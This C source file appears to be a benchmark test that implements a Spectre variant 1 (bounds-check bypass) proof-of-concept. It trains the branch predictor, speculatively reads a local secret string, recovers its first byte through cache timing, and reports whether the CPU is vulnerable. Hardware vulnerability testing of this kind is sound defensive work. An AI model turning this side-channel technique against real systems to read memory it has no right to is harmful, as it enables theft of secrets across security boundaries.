/**
 * spectre-v1: Bounds-Check Bypass (Spectre Variant 1) proof-of-concept.
 *
 * Demonstrates speculative execution past an array bounds check. The branch
 * predictor is trained to take the "in-bounds" path, then a single out-of-
 * bounds index is provided. If the CPU speculatively loads the secret and
 * uses it to index into the probe array, a cache-timing side channel can
 * recover the secret byte.
 */
#include "bench.h"

#define ARRAY_SIZE     16
#define PROBE_ENTRIES  256
#ifndef SECURITY_PROBE_STRIDE
#define SECURITY_PROBE_STRIDE PAGE_SIZE
#endif
#define PROBE_STRIDE   SECURITY_PROBE_STRIDE
#define PROBE_SIZE     (PROBE_ENTRIES * PROBE_STRIDE)

static uint8_t allowed_array[ARRAY_SIZE];
static uint8_t probe_array[PROBE_SIZE]
    __attribute__((aligned(PAGE_SIZE)));

static const char secret[] = "SECRET!";

static volatile unsigned array_size = ARRAY_SIZE;

__attribute__((noinline))
static void victim_function(size_t x) {
  if (x < array_size) {
    volatile uint8_t tmp = probe_array[allowed_array[x] * PROBE_STRIDE];
    (void)tmp;
  }
}

static void evict_probe(void) {
  for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE)
    ((volatile uint8_t *)probe_array)[i];
  fence();
}

#define TRAIN_ROUNDS  20
#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 100
#endif
#define THRESHOLD_MULTIPLIER 2

int main(void) {
  for (int i = 0; i < ARRAY_SIZE; i++)
    allowed_array[i] = (uint8_t)i;
  for (int i = 0; i < PROBE_SIZE; i += PAGE_SIZE)
    probe_array[i] = 0;
  fence();

  size_t malicious_x = (size_t)(secret - (const char *)allowed_array);

  /* Baseline timing */
  uint32_t baseline_hit, baseline_miss;
  {
    evict_probe();
    uint32_t t;
    TIMED_ACCESS(&probe_array[0], t);
    baseline_miss = t;
    TIMED_ACCESS(&probe_array[0], t);
    baseline_hit = t;
  }
  uint32_t threshold = baseline_hit * THRESHOLD_MULTIPLIER;
  if (threshold < 10) threshold = 10;

  report("spectre-v1 baseline", baseline_hit, baseline_miss);

  uint32_t scores[PROBE_ENTRIES];
  memset(scores, 0, sizeof(scores));

  for (int round = 0; round < SECURITY_ATTACK_ROUNDS; round++) {
    evict_probe();

    for (int t = 0; t < TRAIN_ROUNDS; t++)
      victim_function(t % ARRAY_SIZE);

    fence();
    victim_function(malicious_x);
    fence();

    for (int i = 0; i < PROBE_ENTRIES; i++) {
      int idx = ((i * 167) + 13) % PROBE_ENTRIES;
      uint32_t t;
      TIMED_ACCESS(&probe_array[idx * PROBE_STRIDE], t);
      if (t <= threshold)
        scores[idx]++;
    }
  }

  uint32_t max_score = 0;
  int leaked_byte = -1;
  for (int i = 1; i < PROBE_ENTRIES; i++) {
    if (scores[i] > max_score) {
      max_score = scores[i];
      leaked_byte = i;
    }
  }

  printf("[spectre-v1] secret[0] = 0x%02x '%c', leaked = 0x%02x '%c', "
         "score = %u/%u\n",
         (uint8_t)secret[0], secret[0],
         leaked_byte >= 0 ? leaked_byte : 0,
         (leaked_byte >= 0x20 && leaked_byte < 0x7f) ? leaked_byte : '?',
         max_score, (uint32_t)SECURITY_ATTACK_ROUNDS);

  if (leaked_byte == (uint8_t)secret[0] &&
      max_score > SECURITY_ATTACK_ROUNDS / 4)
    printf("[spectre-v1] VULNERABLE: speculative leak detected\n");
  else
    printf("[spectre-v1] NOT VULNERABLE or insufficient signal\n");

  return 0;
}
